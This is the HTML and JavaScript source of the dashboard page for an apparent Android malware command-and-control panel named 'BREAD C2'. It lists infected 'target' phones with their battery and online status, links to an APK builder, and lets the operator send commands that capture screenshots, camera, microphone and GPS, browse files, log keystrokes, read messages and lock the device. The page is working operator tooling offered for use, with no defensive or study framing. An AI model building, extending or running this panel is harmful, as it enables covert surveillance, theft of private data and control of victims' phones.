<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BREAD C2 - Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-2 sidebar">
                <h4 class="text-glow"><i class="bi bi-cpu"></i> BREAD C2</h4>
                <nav class="nav flex-column">
                    <a class="nav-link active" href="panel.html"><i class="bi bi-grid"></i> Dashboard</a>
                    <a class="nav-link" href="target.html"><i class="bi bi-phone"></i> Targets</a>
                    <a class="nav-link" href="commands.html"><i class="bi bi-terminal"></i> Commands</a>
                    <a class="nav-link" href="logs.html"><i class="bi bi-file-earmark-text"></i> Logs</a>
                    <a class="nav-link" href="builder.html"><i class="bi bi-hammer"></i> APK Builder</a>
                    <a class="nav-link" href="settings.html"><i class="bi bi-gear"></i> Settings</a>
                    <hr style="border-color:#1f2a3a;">
                    <a class="nav-link text-danger" href="#" onclick="logout()"><i class="bi bi-box-arrow-right"></i> Logout</a>
                </nav>
            </div>
            <div class="col-md-10 p-4">
                <h3><i class="bi bi-activity text-glow"></i> Control Dashboard</h3>
                <div class="row g-3 mb-4">
                    <div class="col-md-3"><div class="stat-card"><span>Total Targets</span><div class="stat-value" id="totalTargets">0</div></div></div>
                    <div class="col-md-3"><div class="stat-card"><span>Online</span><div class="stat-value text-success" id="onlineTargets">0</div></div></div>
                    <div class="col-md-3"><div class="stat-card"><span>Offline</span><div class="stat-value text-secondary" id="offlineTargets">0</div></div></div>
                    <div class="col-md-3"><div class="stat-card"><span>Commands</span><div class="stat-value text-warning" id="totalCommands">0</div></div></div>
                </div>
                <div class="row g-3 mb-4">
                    <div class="col-md-6">
                        <div class="card"><div class="card-header">Activity Chart</div><div class="card-body"><canvas id="activityChart" height="150"></canvas></div></div>
                    </div>
                    <div class="col-md-6">
                        <div class="card"><div class="card-header">Recent Commands</div><div class="card-body"><div class="terminal" id="recentCommands">[system] Waiting...</div></div></div>
                    </div>
                </div>
                <div class="card">
                    <div class="card-header d-flex justify-content-between">
                        <span><i class="bi bi-phone"></i> Target Devices</span>
                        <span><i class="bi bi-arrow-repeat" onclick="loadTargets()"></i></span>
                    </div>
                    <div class="card-body p-0">
                        <table class="table table-dark table-hover mb-0">
                            <thead><tr><th>Device</th><th>UUID</th><th>Model</th><th>Status</th><th>Battery</th><th>Last Seen</th><th>Action</th></tr></thead>
                            <tbody id="targetBody"></tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script type="module">
        import { API_BASE } from './js/config.js';
        const token = localStorage.getItem('token');
        if (!token) window.location.replace('index.html');

        window.logout = function() {
            localStorage.removeItem('token');
            localStorage.removeItem('api_base');
            window.location.replace('index.html');
        };

        async function loadTargets() {
            try {
                const res = await fetch(API_BASE + '/api/targets', {
                    headers: { 'Authorization': `Bearer ${token}` }
                });
                if (res.status === 401) { logout(); return; }
                const data = await res.json();
                renderTargets(data);
                updateStats(data);
                updateChart(data);
            } catch (e) {
                console.error('Load targets error:', e);
                document.getElementById('recentCommands').innerText = '[error] Failed to load targets';
            }
        }
        window.loadTargets = loadTargets;

        function renderTargets(targets) {
            const body = document.getElementById('targetBody');
            body.innerHTML = '';
            if (!targets || targets.length === 0) {
                body.innerHTML = '<tr><td colspan="7" class="text-center text-muted">No targets registered yet.</td></tr>';
                return;
            }
            targets.forEach(t => {
                const status = t.status === 'online' ? 'online' : 'offline';
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td><i class="bi bi-phone"></i> ${t.device_name || 'Unknown'}</td>
                    <td><small>${t.uuid ? t.uuid.substring(0,12) + '…' : 'N/A'}</small></td>
                    <td>${t.model || 'N/A'}</td>
                    <td><span class="badge badge-${status}">${status.toUpperCase()}</span></td>
                    <td>${t.battery || 0}%</td>
                    <td>${t.last_seen || 'Never'}</td>
                    <td>
                        <button class="btn btn-sm btn-primary" onclick="controlTarget('${t.uuid}')">
                            <i class="bi bi-joystick"></i>
                        </button>
                        <button class="btn btn-sm btn-outline-info" onclick="viewTarget('${t.uuid}')">
                            <i class="bi bi-eye"></i>
                        </button>
                    </td>
                `;
                body.appendChild(row);
            });
        }

        function updateStats(targets) {
            const total = targets.length;
            const online = targets.filter(t => t.status === 'online').length;
            const offline = total - online;
            document.getElementById('totalTargets').innerText = total;
            document.getElementById('onlineTargets').innerText = online;
            document.getElementById('offlineTargets').innerText = offline;
            document.getElementById('totalCommands').innerText = '0';
        }

        let chartInstance = null;
        function updateChart(targets) {
            const ctx = document.getElementById('activityChart');
            if (!ctx) return;
            const onlineCount = targets.filter(t => t.status === 'online').length;
            const offlineCount = targets.length - onlineCount;
            if (chartInstance) {
                chartInstance.data.datasets[0].data = [onlineCount, offlineCount];
                chartInstance.update();
                return;
            }
            chartInstance = new Chart(ctx, {
                type: 'doughnut',
                data: {
                    labels: ['Online', 'Offline'],
                    datasets: [{
                        data: [onlineCount, offlineCount],
                        backgroundColor: ['#00d4ff', '#4a5568'],
                        borderColor: '#0a0e17',
                        borderWidth: 2
                    }]
                },
                options: {
                    responsive: true,
                    plugins: {
                        legend: { labels: { color: '#c8d6e5' } }
                    }
                }
            });
        }

        window.controlTarget = function(uuid) {
            const cmd = prompt(`Commands for ${uuid}:\n1: screenshot\n2: camera\n3: gps\n4: mic\n5: file_explorer\n6: lockdown\n7: keylog\n8: read_messages\n\nEnter command number:`);
            if (!cmd) return;
            const commands = ['screenshot', 'camera', 'gps', 'mic', 'file_explorer', 'lockdown', 'keylog', 'read_messages'];
            const selected = commands[parseInt(cmd) - 1];
            if (!selected) return alert('Invalid command number');
            fetch(API_BASE + '/api/commands', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                },
                body: JSON.stringify({ target_uuid: uuid, command: selected, params: {} })
            })
            .then(r => r.json())
            .then(d => {
                if (d.command_id) {
                    alert(`✅ Command sent! ID: ${d.command_id}\nStatus: ${d.status}`);
                    document.getElementById('recentCommands').innerHTML = `[${new Date().toLocaleTimeString()}] Command ${selected} sent to ${uuid.substring(0,8)} (ID: ${d.command_id})`;
                } else {
                    alert('❌ Error: ' + (d.error || 'Unknown'));
                }
            })
            .catch(e => alert('Network error: ' + e.message));
        };

        window.viewTarget = function(uuid) {
            window.location.href = 'target.html?uuid=' + encodeURIComponent(uuid);
        };

        loadTargets();
        setInterval(loadTargets, 15000);
    </script>
</body>
</html>
